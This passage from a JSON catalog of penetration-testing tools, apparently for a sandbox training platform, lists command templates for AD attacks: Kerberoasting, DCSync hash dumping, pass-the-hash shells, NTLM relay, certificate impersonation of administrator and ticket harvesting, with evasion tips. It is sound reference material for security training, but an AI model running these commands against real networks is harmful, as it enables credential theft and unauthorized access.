          "note": "-b takes the base DN, e.g. DC=corp,DC=local."
        },
        {
          "label": "Find Kerberoastable accounts",
          "template": "ldapsearch -x -H ldap://<target> -D '<user>@<domain>' -w <password> -b '<base-dn>' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName",
          "note": "Service accounts with an SPN are the Kerberoasting candidates."
        }
      ],
      "flags": [
        {
          "flag": "-x",
          "what": "simple authentication"
        },
        {
          "flag": "-D / -w",
          "what": "bind DN / password"
        },
        {
          "flag": "-b",
          "what": "search base DN"
        }
      ]
    },
    {
      "name": "bloodhound-python",
      "aliases": [
        "bloodhound"
      ],
      "category": "network-ad",
      "purpose": "Remote AD collector producing the graph BloodHound analyses — sessions, ACLs, group nesting and delegation paths.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "AD graph collection",
        "ACL enumeration",
        "attack path discovery"
      ],
      "docs": "https://github.com/dirkjanm/BloodHound.py",
      "templates": [
        {
          "label": "Full collection",
          "template": "bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All --zip",
          "note": "-c All includes session data; DCOnly is far quieter if that matters."
        },
        {
          "label": "DC-only collection",
          "template": "bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c DCOnly --zip",
          "note": "Reads only from the DC — no host-by-host touching."
        }
      ],
      "flags": [
        {
          "flag": "-c",
          "what": "collection method (All, DCOnly, Session, ACL…)"
        },
        {
          "flag": "-dc",
          "what": "domain controller"
        },
        {
          "flag": "--zip",
          "what": "bundle the JSON for import"
        }
      ]
    },
    {
      "name": "hashcat",
      "category": "credentials",
      "purpose": "GPU-accelerated password recovery across hundreds of hash types, with rule, mask and hybrid attack modes.",
      "phases": [
        "exploitation",
        "post-exploitation"
      ],
      "techniques": [
        "hash cracking",
        "rule-based attack",
        "mask attack"
      ],
      "docs": "https://hashcat.net/wiki/",
      "templates": [
        {
          "label": "Wordlist attack",
          "template": "hashcat -m <hash-mode> -a 0 <hashfile> <wordlist>",
          "note": "-m is the hash MODE (1000 NTLM, 13100 Kerberoast, 22000 WPA)."
        },
        {
          "label": "Wordlist + rules",
          "template": "hashcat -m <hash-mode> -a 0 <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
          "note": "Rules are usually worth more than a bigger wordlist."
        },
        {
          "label": "Mask attack",
          "template": "hashcat -m <hash-mode> -a 3 <hashfile> '?u?l?l?l?l?d?d?d'",
          "note": "For a known password pattern — much faster than brute force."
        },
        {
          "label": "Show cracked",
          "template": "hashcat -m <hash-mode> <hashfile> --show",
          "note": "Reads the potfile; no cracking work is done."
        }
      ],
      "flags": [
        {
          "flag": "-m",
          "what": "hash type/mode number"
        },
        {
          "flag": "-a",
          "what": "attack mode (0 wordlist, 3 mask, 6/7 hybrid)"
        },
        {
          "flag": "-r",
          "what": "rule file"
        },
        {
          "flag": "--show",
          "what": "print already-cracked hashes"
        }
      ]
    },
    {
      "name": "john",
      "aliases": [
        "john the ripper",
        "jtr"
      ],
      "category": "credentials",
      "purpose": "Password cracker with a large family of *2john converters that turn files (SSH keys, ZIP, KeePass, PDF) into crackable hashes.",
      "phases": [
        "exploitation",
        "post-exploitation"
      ],
      "techniques": [
        "hash cracking",
        "format conversion",
        "wordlist attack"
      ],
      "docs": "https://www.openwall.com/john/doc/",
      "templates": [
        {
          "label": "Wordlist attack",
          "template": "john --wordlist=<wordlist> <hashfile>",
          "note": "Add --rules to mutate the wordlist."
        },
        {
          "label": "Convert an SSH key, then crack",
          "template": "ssh2john <file> > <output> && john --wordlist=<wordlist> <output>",
          "note": "The *2john family covers zip2john, keepass2john, pdf2john and more."
        },
        {
          "label": "Show cracked",
          "template": "john --show <hashfile>",
          "note": "Reads the pot file; no work is done."
        }
      ],
      "flags": [
        {
          "flag": "--wordlist",
          "what": "wordlist to use"
        },
        {
          "flag": "--rules",
          "what": "apply mangling rules"
        },
        {
          "flag": "--format",
          "what": "force the hash format"
        }
      ]
    },
    {
      "name": "prowler",
      "category": "cloud",
      "purpose": "Cloud security posture assessment for AWS/Azure/GCP against CIS and many other compliance frameworks.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "cloud posture assessment",
        "IAM review",
        "compliance checks"
      ],
      "docs": "https://docs.prowler.com/",
      "templates": [
        {
          "label": "Full AWS assessment",
          "template": "prowler aws --output-directory <output>",
          "note": "Read-only against the account the credentials belong to."
        },
        {
          "label": "CIS benchmark only",
          "template": "prowler aws --compliance cis_2.0_aws --output-directory <output>",
          "note": "Narrower and much faster than the full check set."
        },
        {
          "label": "Azure assessment",
          "template": "prowler azure --az-cli-auth --output-directory <output>",
          "note": "Uses your existing az CLI session."
        }
      ],
      "flags": [
        {
          "flag": "aws / azure / gcp / kubernetes",
          "what": "the provider"
        },
        {
          "flag": "--compliance",
          "what": "run one compliance framework"
        },
        {
          "flag": "--services",
          "what": "limit to named services"
        }
      ]
    },
    {
      "name": "scoutsuite",
      "category": "cloud",
      "purpose": "Multi-cloud auditing that collects configuration and renders a browsable HTML risk report.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "cloud configuration audit",
        "attack surface review"
      ],
      "docs": "https://github.com/nccgroup/ScoutSuite/wiki",
      "templates": [
        {
          "label": "AWS audit",
          "template": "scout aws --report-dir <output>",
          "note": "Read-only collection; the report is a static HTML tree."
        },
        {
          "label": "Azure audit",
          "template": "scout azure --cli --report-dir <output>",
          "note": "Uses the logged-in az CLI identity."
        }
      ],
      "flags": [
        {
          "flag": "aws / azure / gcp",
          "what": "the provider"
        },
        {
          "flag": "--report-dir",
          "what": "where the HTML report is written"
        },
        {
          "flag": "--services",
          "what": "limit which services are collected"
        }
      ]
    },
    {
      "name": "pacu",
      "category": "cloud",
      "purpose": "AWS exploitation framework — enumerate permissions and map IAM privilege-escalation paths against the account the credentials belong to.",
      "phases": [
        "enumeration",
        "privesc"
      ],
      "techniques": [
        "IAM permission enumeration",
        "privilege-escalation path discovery",
        "cloud attack surface mapping"
      ],
      "docs": "https://github.com/RhinoSecurityLabs/pacu",
      "templates": [
        {
          "label": "Enumerate IAM permissions",
          "template": "pacu --session hackpit --module-name iam__enum_permissions --exec",
          "note": "Read-only: enumerates the caller's IAM permissions. Uses the account the sandbox credentials belong to."
        },
        {
          "label": "Scan for privilege escalation",
          "template": "pacu --session hackpit --module-name iam__privesc_scan --exec --no-changes",
          "note": "--no-changes keeps it detection-only: it reports privesc paths without exploiting them."
        }
      ],
      "flags": [
        {
          "flag": "--session",
          "what": "the pacu session (loot/state) name"
        },
        {
          "flag": "--module-name",
          "what": "the module to run"
        },
        {
          "flag": "--no-changes",
          "what": "detection-only — do not mutate the account"
        }
      ]
    },
    {
      "name": "cloudfox",
      "category": "cloud",
      "purpose": "Read-only cloud attack-surface and IAM permission mapper (AWS/Azure/GCP) — finds exploitable relationships an attacker would use, without changing anything.",
      "phases": [
        "enumeration",
        "privesc"
      ],
      "techniques": [
        "IAM permission mapping",
        "attack surface enumeration",
        "principal/role relationship discovery"
      ],
      "docs": "https://github.com/BishopFox/cloudfox",
      "templates": [
        {
          "label": "AWS all-checks",
          "template": "cloudfox aws all-checks",
          "note": "Read-only enumeration against the account the sandbox credentials belong to; writes loot to disk."
        },
        {
          "label": "Map who-can-do-what (permissions)",
          "template": "cloudfox aws permissions",
          "note": "Builds the principal -> permission table the IAM privilege-escalation graph reasons over."
        }
      ],
      "flags": [
        {
          "flag": "aws / azure / gcp",
          "what": "the provider"
        },
        {
          "flag": "--profile",
          "what": "the named credential profile to use"
        }
      ]
    },
    {
      "name": "trivy",
      "category": "cloud",
      "purpose": "Scanner for container images, filesystems and IaC — known CVEs, misconfiguration and exposed secrets.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "container CVE scanning",
        "IaC misconfiguration",
        "secret detection"
      ],
      "docs": "https://aquasecurity.github.io/trivy/",
      "templates": [
        {
          "label": "Scan a container image",
          "template": "trivy image <target> --severity HIGH,CRITICAL",
          "note": "Pulls the image and reads it — nothing is run from inside it."
        },
        {
          "label": "Scan a filesystem",
          "template": "trivy fs <file> --scanners vuln,secret,misconfig",
          "note": "Static: dependency CVEs, hardcoded secrets and IaC issues in one pass."
        },
        {
          "label": "Scan IaC",
          "template": "trivy config <file> --severity HIGH,CRITICAL",
          "note": "Terraform/CloudFormation/Kubernetes manifests."
        }
      ],
      "flags": [
        {
          "flag": "image / fs / config / repo",
          "what": "the target kind"
        },
        {
          "flag": "--severity",
          "what": "filter by severity"
        },
        {
          "flag": "--scanners",
          "what": "vuln, secret, misconfig, license"
        }
      ]
    },
    {
      "name": "kube-hunter",
      "category": "cloud",
      "purpose": "Kubernetes cluster weakness hunter — probes for exposed components and known cluster attack paths.",
      "phases": [
        "recon",
        "enumeration"
      ],
      "techniques": [
        "Kubernetes enumeration",
        "exposed component discovery"
      ],
      "docs": "https://github.com/aquasecurity/kube-hunter",
      "templates": [
        {
          "label": "Remote scan",
          "template": "kube-hunter --remote <target>",
          "note": "Probes from outside the cluster."
        },
        {
          "label": "Scan a CIDR",
          "template": "kube-hunter --cidr <target>",
          "note": "Confirm the range is in scope — this sweeps a network."
        },
        {
          "label": "From inside a pod",
          "template": "kube-hunter --pod",
          "note": "Shows what a compromised pod can reach — the lateral view."
        }
      ],
      "flags": [
        {
          "flag": "--remote",
          "what": "scan a remote host"
        },
        {
          "flag": "--cidr",
          "what": "scan a network range"
        },
        {
          "flag": "--active",
          "what": "include active (intrusive) tests"
        }
      ]
    },
    {
      "name": "ghidra",
      "aliases": [
        "analyzeHeadless"
      ],
      "category": "binary-re",
      "purpose": "Full reverse-engineering suite with a decompiler — static analysis of binaries across many architectures.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "static binary analysis",
        "decompilation",
        "vulnerability discovery"
      ],
      "docs": "https://ghidra-sre.org/",
      "templates": [
        {
          "label": "Headless analysis",
          "template": "analyzeHeadless <output> <project> -import <binary> -scriptPath <file>",
          "note": "Static: the binary is disassembled and decompiled, never executed."
        }
      ],
      "flags": [
        {
          "flag": "-import",
          "what": "binary to import into the project"
        },
        {
          "flag": "-postScript",
          "what": "script to run after analysis"
        },
        {
          "flag": "-scriptPath",
          "what": "where to find scripts"
        }
      ]
    },
    {
      "name": "radare2",
      "aliases": [
        "r2",
        "rizin"
      ],
      "category": "binary-re",
      "purpose": "Command-line reverse-engineering framework — disassembly, analysis, patching and debugging.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "static binary analysis",
        "disassembly",
        "binary patching"
      ],
      "docs": "https://book.rada.re/",
      "templates": [
        {
          "label": "Analyse and list functions",
          "template": "r2 -A -qc 'afl' <binary>",
          "note": "Static analysis; -q exits after the command."
        },
        {
          "label": "Disassemble main",
          "template": "r2 -A -qc 'pdf @ main' <binary>",
          "note": "pdf = print disassembly of a function."
        },
        {
          "label": "List strings",
          "template": "r2 -qc 'izz' <binary>",
          "note": "izz covers the whole binary, not just the data section."
        }
      ],
      "flags": [
        {
          "flag": "-A",
          "what": "run full analysis on load"
        },
        {
          "flag": "-qc",
          "what": "run a command then quit"
        },
        {
          "flag": "-d",
          "what": "debug mode (this one DOES run the binary)"
        }
      ]
    },
    {
      "name": "gdb",
      "category": "binary-re",
      "purpose": "The GNU debugger — dynamic analysis, crash triage and exploit development, usually with a plugin like pwndbg or GEF.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "dynamic analysis",
        "crash triage",
        "exploit development"
      ],
      "docs": "https://sourceware.org/gdb/current/onlinedocs/gdb/",
      "templates": [
        {
          "label": "Inspect functions without running",
          "template": "gdb -batch -ex 'info functions' <binary>",
          "note": "-batch with info commands inspects the file; it does not run it."
        },
        {
          "label": "Check binary protections",
          "template": "gdb -batch -ex 'checksec' <binary>",
          "note": "Needs pwndbg/GEF. NX/PIE/canary decide the exploitation route."
        }
      ],
      "flags": [
        {
          "flag": "-batch",
          "what": "run commands then exit, non-interactive"
        },
        {
          "flag": "-ex",
          "what": "a command to execute"
        },
        {
          "flag": "-p",
          "what": "attach to a running process"
        }
      ]
    },
    {
      "name": "strings",
      "category": "binary-re",
      "purpose": "Extracts printable strings from a binary — the cheapest first look for URLs, paths, keys and version markers.",
      "phases": [
        "recon",
        "exploitation"
      ],
      "techniques": [
        "static string extraction",
        "secret discovery"
      ],
      "docs": "https://linux.die.net/man/1/strings",
      "templates": [
        {
          "label": "All strings",
          "template": "strings -n 8 <binary>",
          "note": "-n 8 cuts most of the noise; purely static."
        },
        {
          "label": "Search for a marker",
          "template": "strings <binary> | grep -i <pattern>",
          "note": "Hardcoded hosts, keys and flags surface here first."
        }
      ],
      "flags": [
        {
          "flag": "-n",
          "what": "minimum string length"
        },
        {
          "flag": "-e",
          "what": "encoding (s, l, b, L, B)"
        },
        {
          "flag": "-t",
          "what": "print the file offset"
        }
      ]
    },
    {
      "name": "GetUserSPNs.py",
      "aliases": ["impacket-GetUserSPNs", "GetUserSPNs"],
      "category": "network-ad",
      "purpose": "Impacket's Kerberoasting script — lists domain accounts that have an SPN and requests a TGS for each, whose encrypted portion is crackable offline as the service account's password.",
      "phases": ["enumeration", "exploitation", "privesc"],
      "techniques": ["kerberoasting", "SPN enumeration", "offline credential cracking"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Kerberoast — request a TGS for every SPN account",
          "template": "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile <output>",
          "note": "Needs any valid domain credential. Feed <output> to hashcat -m 13100."
        },
        {
          "label": "List SPN accounts without requesting tickets",
          "template": "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip>",
          "note": "Quieter first look — see which accounts are roastable before pulling tickets."
        },
        {
          "label": "Roast with a hash instead of a password",
          "template": "GetUserSPNs.py <domain>/<user> -hashes <ntlm-hash> -dc-ip <dc-ip> -request",
          "note": "Pass-the-hash path when you have the NT hash but not the plaintext."
        }
      ],
      "flags": [
        {"flag": "-request", "what": "actually request the TGS tickets"},
        {"flag": "-dc-ip", "what": "domain controller to talk to"},
        {"flag": "-outputfile", "what": "write hashes to a file"},
        {"flag": "-hashes", "what": "authenticate with LM:NT instead of a password"},
        {"flag": "-request-user", "what": "target one account only"}
      ]
    },
    {
      "name": "GetNPUsers.py",
      "aliases": ["impacket-GetNPUsers", "GetNPUsers"],
      "category": "network-ad",
      "purpose": "Impacket's AS-REP roasting script — finds accounts with Kerberos pre-authentication disabled and pulls an AS-REP whose encrypted blob cracks offline. The one Kerberos attack that needs no credentials at all.",
      "phases": ["enumeration", "exploitation"],
      "techniques": ["AS-REP roasting", "pre-auth disabled accounts", "unauthenticated credential access"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "AS-REP roast a username list (no credentials needed)",
          "template": "GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <userlist> -no-pass -format hashcat -outputfile <output>",
          "note": "The trailing slash after the domain is required. Crack with hashcat -m 18200."
        },
        {
          "label": "Enumerate roastable accounts with valid credentials",
          "template": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc-ip> -request -format hashcat -outputfile <output>",
          "note": "Authenticated: asks the DC directly which accounts have DONT_REQ_PREAUTH."
        }
      ],
      "flags": [
        {"flag": "-usersfile", "what": "username list to try"},
        {"flag": "-no-pass", "what": "do not prompt for a password"},
        {"flag": "-format", "what": "hashcat or john output format"},
        {"flag": "-request", "what": "request the AS-REP, not just enumerate"}
      ]
    },
    {
      "name": "secretsdump.py",
      "aliases": ["impacket-secretsdump", "secretsdump"],
      "category": "network-ad",
      "purpose": "Impacket's credential dumper — pulls SAM/LSA secrets and cached logons from a host, or replicates the whole domain's hashes from a DC via DCSync.",
      "phases": ["exploitation", "privesc", "post-exploitation"],
      "techniques": ["SAM/LSA dumping", "DCSync", "pass-the-hash material", "cached credential recovery"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Dump local SAM, LSA secrets and cached logons",
          "template": "secretsdump.py <domain>/<user>:<password>@<target>",
          "note": "Needs local admin on the host. The single highest-yield post-compromise step."
        },
        {
          "label": "DCSync every NTLM hash in the domain",
          "template": "secretsdump.py <domain>/<user>:<password>@<dc-ip> -just-dc-ntlm -outputfile <output>",
          "note": "Requires replication rights (DA, or DS-Replication-Get-Changes*). Very loud."
        },
        {
          "label": "Pass-the-hash instead of a password",
          "template": "secretsdump.py <domain>/<user>@<target> -hashes <ntlm-hash>",
          "note": "Reuses a hash recovered from another host — no plaintext required."
        },
        {
          "label": "DCSync a single account",
          "template": "secretsdump.py <domain>/<user>:<password>@<dc-ip> -just-dc-user krbtgt",
          "note": "Far quieter than a full dump when you only need one account."
        }
      ],
      "flags": [
        {"flag": "-just-dc-ntlm", "what": "DCSync, NTLM hashes only"},
        {"flag": "-just-dc-user", "what": "DCSync one named account"},
        {"flag": "-hashes", "what": "authenticate with LM:NT"},
        {"flag": "-outputfile", "what": "write the dump to a file"},
        {"flag": "-sam / -system", "what": "parse offline registry hives instead"}
      ]
    },
    {
      "name": "psexec.py",
      "aliases": ["impacket-psexec", "psexec"],
      "category": "network-ad",
      "purpose": "Impacket remote execution — uploads a service binary over SMB and runs it, giving a fully interactive SYSTEM shell. The loudest of the three exec methods and the most likely to be caught.",
      "phases": ["exploitation", "post-exploitation"],
      "techniques": ["SMB remote execution", "service creation", "lateral movement"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Interactive SYSTEM shell",
          "template": "psexec.py <domain>/<user>:<password>@<target>",
          "note": "Needs local admin + ADMIN$ writable. Creates and deletes a service — noisy."
        },
        {
          "label": "Pass-the-hash",
          "template": "psexec.py <domain>/<user>@<target> -hashes <ntlm-hash>",
          "note": "Same access without the plaintext password."
        },
        {
          "label": "Run one command and exit",
          "template": "psexec.py <domain>/<user>:<password>@<target> '<pattern>'",
          "note": "Single command instead of a shell; <pattern> is the command line to run."
        }
      ],
      "flags": [
        {"flag": "-hashes", "what": "authenticate with LM:NT"},
        {"flag": "-service-name", "what": "name the created service (default is random)"},
        {"flag": "-k", "what": "use Kerberos auth from the ccache"}
      ]
    },
    {
      "name": "wmiexec.py",
      "aliases": ["impacket-wmiexec", "wmiexec"],
      "category": "network-ad",
      "purpose": "Impacket remote execution over WMI — semi-interactive, and notably quieter than psexec because it creates no service and drops no binary.",
      "phases": ["exploitation", "post-exploitation"],
      "techniques": ["WMI remote execution", "lateral movement", "fileless execution"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Semi-interactive shell over WMI",
          "template": "wmiexec.py <domain>/<user>:<password>@<target>",
          "note": "Preferred over psexec when you want less noise; each command is a new process."
        },
        {
          "label": "Pass-the-hash",
          "template": "wmiexec.py <domain>/<user>@<target> -hashes <ntlm-hash>",
          "note": "Hash-only authentication."
        },
        {
          "label": "Run a single command",
          "template": "wmiexec.py <domain>/<user>:<password>@<target> '<pattern>'",
          "note": "One-shot execution; <pattern> is the command line."
        }
      ],
      "flags": [
        {"flag": "-hashes", "what": "authenticate with LM:NT"},
        {"flag": "-nooutput", "what": "do not retrieve output (no SMB share needed)"},
        {"flag": "-k", "what": "Kerberos auth from the ccache"}
      ]
    },
    {
      "name": "smbexec.py",
      "aliases": ["impacket-smbexec", "smbexec"],
      "category": "network-ad",
      "purpose": "Impacket remote execution over SMB using a temporary service that writes output to a share — no binary upload, so it evades some AV that catches psexec.",
      "phases": ["exploitation", "post-exploitation"],
      "techniques": ["SMB remote execution", "lateral movement"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Semi-interactive shell over SMB",
          "template": "smbexec.py <domain>/<user>:<password>@<target>",
          "note": "Third exec option when psexec and wmiexec are blocked."
        },
        {
          "label": "Pass-the-hash",
          "template": "smbexec.py <domain>/<user>@<target> -hashes <ntlm-hash>",
          "note": "Hash-only authentication."
        }
      ],
      "flags": [
        {"flag": "-hashes", "what": "authenticate with LM:NT"},
        {"flag": "-share", "what": "share used to read command output"},
        {"flag": "-mode", "what": "SHARE or SERVER output mode"}
      ]
    },
    {
      "name": "ntlmrelayx.py",
      "aliases": ["impacket-ntlmrelayx", "ntlmrelayx"],
      "category": "network-ad",
      "purpose": "Impacket's NTLM relay — takes an authentication coerced or poisoned out of a victim and replays it to another service, turning a captured hash you cannot crack into live authenticated access.",
      "phases": ["exploitation", "privesc"],
      "techniques": ["NTLM relay", "SMB signing abuse", "LDAP relay", "AD CS ESC8 relay"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Relay to a list of SMB targets",
          "template": "ntlmrelayx.py -tf <file> -smb2support -of <output>",
          "note": "Only works against hosts with SMB signing NOT required — enumerate that first."
        },
        {
          "label": "Relay to LDAP and dump the domain",
          "template": "ntlmrelayx.py -t ldaps://<dc-ip> --dump-laps --dump-gmsa",
          "note": "LDAPS avoids the channel-binding rejection plain LDAP usually gives."
        },
        {
          "label": "Relay to AD CS web enrollment (ESC8)",
          "template": "ntlmrelayx.py -t http://<dc-ip>/certsrv/certfnsh.asp -smb2support --adcs --template <template-name>",
          "note": "Yields a certificate for the relayed account — authenticate with it via certipy."
        },
        {
          "label": "Relay and escalate an account over LDAP",
          "template": "ntlmrelayx.py -t ldaps://<dc-ip> --escalate-user <user>",
          "note": "Grants <user> DCSync rights when the relayed identity can write the domain ACL."
        }
      ],
      "flags": [
        {"flag": "-tf", "what": "file of relay targets"},
        {"flag": "-smb2support", "what": "accept SMB2 clients"},
        {"flag": "--adcs", "what": "relay to AD CS web enrollment"},
        {"flag": "--escalate-user", "what": "grant the named user DCSync rights"},
        {"flag": "-socks", "what": "keep sessions open behind a SOCKS proxy"}
      ]
    },
    {
      "name": "mssqlclient.py",
      "aliases": ["impacket-mssqlclient", "mssqlclient"],
      "category": "network-ad",
      "purpose": "Impacket MSSQL client — authenticates to SQL Server with domain or SQL credentials and gives a query shell, xp_cmdshell execution and link enumeration.",
      "phases": ["enumeration", "exploitation", "privesc"],
      "techniques": ["MSSQL authentication", "xp_cmdshell execution", "database link abuse", "impersonation"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Connect with Windows authentication",
          "template": "mssqlclient.py <domain>/<user>:<password>@<target> -windows-auth",
          "note": "-windows-auth is the domain path; omit it for a SQL-native login."
        },
        {
          "label": "Connect with a hash",
          "template": "mssqlclient.py <domain>/<user>@<target> -hashes <ntlm-hash> -windows-auth",
          "note": "Pass-the-hash into SQL Server."
        },
        {
          "label": "Enable and use xp_cmdshell (once connected)",
          "template": "enable_xp_cmdshell",
          "note": "Then `xp_cmdshell whoami`. Requires sysadmin; this is command execution on the host."
        },
        {
          "label": "Enumerate linked servers (once connected)",
          "template": "enum_links",
          "note": "Linked servers often chain into another instance with higher privileges."
        }
      ],
      "flags": [
        {"flag": "-windows-auth", "what": "use Windows/domain authentication"},
        {"flag": "-hashes", "what": "authenticate with LM:NT"},
        {"flag": "-db", "what": "database to connect to"}
      ]
    },
    {
      "name": "getTGT.py",
      "aliases": ["impacket-getTGT", "getTGT"],
      "category": "network-ad",
      "purpose": "Impacket ticket requester — exchanges a password, NT hash or AES key for a Kerberos TGT written to a ccache, which every other Kerberos-aware tool can then reuse.",
      "phases": ["exploitation", "privesc"],
      "techniques": ["Kerberos TGT request", "pass-the-key", "overpass-the-hash"],
      "docs": "https://github.com/fortra/impacket",
      "templates": [
        {
          "label": "Request a TGT with a password",
          "template": "getTGT.py <domain>/<user>:<password> -dc-ip <dc-ip>",
          "note": "Writes <user>.ccache; then `export KRB5CCNAME=<user>.ccache` and use -k elsewhere."
        },
        {
          "label": "Overpass-the-hash — TGT from an NT hash",
          "template": "getTGT.py <domain>/<user> -hashes <ntlm-hash> -dc-ip <dc-ip>",
          "note": "Turns a hash you cannot crack into a usable Kerberos ticket."
        }
      ],
      "flags": [
        {"flag": "-hashes", "what": "LM:NT instead of a password"},
        {"flag": "-aesKey", "what": "AES key instead of a password"},
        {"flag": "-dc-ip", "what": "domain controller to ask"}
      ]
    },
    {
      "name": "certipy",
      "aliases": ["certipy-ad"],
      "category": "network-ad",
      "purpose": "AD Certificate Services attack tool — enumerates certificate templates, flags the misconfigurations (ESC1-ESC11) that let a low-privileged user enrol as anyone, requests the certificate and authenticates with it.",
      "phases": ["enumeration", "privesc", "exploitation"],
      "techniques": ["AD CS enumeration", "ESC1 template abuse", "certificate-based authentication", "shadow credentials"],
      "docs": "https://github.com/ly4k/Certipy",
      "templates": [
        {
          "label": "Find vulnerable certificate templates",
          "template": "certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -vulnerable -stdout",
          "note": "Start here — -vulnerable filters to templates with a real escalation path."
        },
        {
          "label": "Request a certificate as another user (ESC1)",
          "template": "certipy req -u <user>@<domain> -p <password> -target <target> -ca <ca> -template <template-name> -upn administrator@<domain>",
          "note": "Works when the template allows a requester-supplied SAN and client authentication."
        },
        {
          "label": "Authenticate with the certificate for a TGT and NT hash",
          "template": "certipy auth -pfx <cert> -dc-ip <dc-ip>",
          "note": "Turns the .pfx into a Kerberos TGT and the account's NT hash."
        },
        {
          "label": "Shadow credentials — add a key credential to an account",
          "template": "certipy shadow auto -u <user>@<domain> -p <password> -account <spn-user> -dc-ip <dc-ip>",
          "note": "Needs write access to the target account's msDS-KeyCredentialLink."
        }
      ],
      "flags": [
        {"flag": "-vulnerable", "what": "only show templates with an escalation path"},
        {"flag": "-stdout", "what": "print instead of writing files"},
        {"flag": "-upn", "what": "the identity to request the certificate as"},
        {"flag": "-ca", "what": "certificate authority name"},
        {"flag": "-template", "what": "certificate template name"}
      ]
    },
    {
      "name": "certify",
      "platform": "windows",
      "aliases": [
        "Certify.exe"
      ],
      "category": "network-ad",
      "purpose": "On-host AD CS (ADCS) abuse tool for Windows - the .NET counterpart to certipy. Enumerates certificate templates and CA misconfigurations (ESC1-ESC8), then requests a certificate as a chosen principal (e.g. a Domain Admin) from inside a session.",
      "phases": [
        "enumeration",
        "privesc",
        "exploitation"
      ],
      "techniques": [
        "AD CS enumeration",
        "ESC1 template abuse",
        "ESC6 SAN abuse",
        "certificate-based authentication"
      ],
      "docs": "https://github.com/GhostPack/Certify",
      "templates": [
        {
          "label": "Find vulnerable certificate templates",
          "template": "Certify.exe find /vulnerable",
          "note": "Read-only enumeration - start here to see which ESC paths exist."
        },
        {
          "label": "Request a cert as another user (ESC1/ESC6)",
          "template": "Certify.exe request /ca:<ca> /template:<template-name> /altname:administrator",
          "note": "Enrols a certificate with a chosen SAN; pair with Rubeus asktgt to authenticate."
        },
        {
          "label": "Enrol on behalf of a DA (ESC3)",
          "template": "Certify.exe request /ca:<ca> /template:<template-name> /onbehalfof:<domain>\\administrator /enrollcert:agent.pfx",
          "note": "Uses an enrollment-agent cert to request on behalf of a Domain Admin."
        }
      ],
      "flags": [
        {
          "flag": "/vulnerable",
          "what": "filter enumeration to templates with an escalation path"
        },
        {
          "flag": "/altname:",
          "what": "the SAN (user to impersonate) on the requested cert"
        },
        {
          "flag": "/ca:",
          "what": "target certificate authority"
        }
      ]
    },
    {
      "name": "evil-winrm",
      "category": "network-ad",
      "purpose": "WinRM shell client — the standard way to use recovered Windows credentials interactively once the account is in Remote Management Users.",
      "phases": ["exploitation", "post-exploitation"],
      "techniques": ["WinRM authentication", "lateral movement", "pass-the-hash shell"],
      "docs": "https://github.com/Hackplayers/evil-winrm",
      "templates": [
        {
          "label": "Shell with a password",
          "template": "evil-winrm -i <target> -u <user> -p <password>",
          "note": "Port 5985. Check the account is in Remote Management Users first."
        },
        {
          "label": "Pass-the-hash shell",
          "template": "evil-winrm -i <target> -u <user> -H <ntlm-hash>",
          "note": "NT hash only — no plaintext needed."
        },
        {
          "label": "With upload/download directories",
          "template": "evil-winrm -i <target> -u <user> -p <password> -s <output> -e <output>",
          "note": "-s scripts dir, -e executables dir; enables the built-in in-memory loaders."
        },
        {
          "label": "Certificate authentication over HTTPS (5986)",
          "template": "evil-winrm -i <target> -c <cert> -k <keyfile> -S",
          "note": "-S switches to SSL; used when password auth is disabled."
        }
      ],
      "flags": [
        {"flag": "-i", "what": "target host"},
        {"flag": "-H", "what": "NT hash instead of a password"},
        {"flag": "-S", "what": "use SSL (port 5986)"},
        {"flag": "-s / -e", "what": "local scripts / executables directory"}
      ]
    },
    {
      "name": "rubeus",
      "platform": "windows",
      "aliases": ["Rubeus.exe"],
      "category": "network-ad",
      "purpose": "On-host Kerberos toolkit for Windows — roasting, ticket harvesting, pass-the-ticket and delegation abuse from inside a session, where Impacket's network-side equivalents cannot reach.",
      "phases": ["enumeration", "privesc", "post-exploitation"],
      "techniques": ["kerberoasting", "AS-REP roasting", "pass-the-ticket", "delegation abuse", "ticket harvesting"],
      "docs": "https://github.com/GhostPack/Rubeus",
      "templates": [
        {
          "label": "Kerberoast from inside the domain",
          "template": "Rubeus.exe kerberoast /format:hashcat /outfile:<output>",
          "note": "Runs in the current user's context — no credentials to supply."
        },
        {
          "label": "AS-REP roast",
          "template": "Rubeus.exe asreproast /format:hashcat /outfile:<output>",
          "note": "Finds pre-auth-disabled accounts from the session's own context."
        },
        {
          "label": "Harvest TGTs from memory",
          "template": "Rubeus.exe harvest /interval:30",
          "note": "Needs elevation. Collects tickets as other users authenticate."
        },
        {
          "label": "Pass-the-ticket",
          "template": "Rubeus.exe ptt /ticket:<file>",
          "note": "Injects a base64 or .kirbi ticket into the current logon session."
        }
      ],
      "flags": [
        {"flag": "/format:hashcat", "what": "hashcat-ready output"},
        {"flag": "/outfile:", "what": "write hashes to a file"},
        {"flag": "/nowrap", "what": "unwrapped base64 (easier to copy)"},
        {"flag": "/ticket:", "what": "ticket to inject or use"}
      ]
    },
    {
      "name": "ldapdomaindump",
      "category": "network-ad",
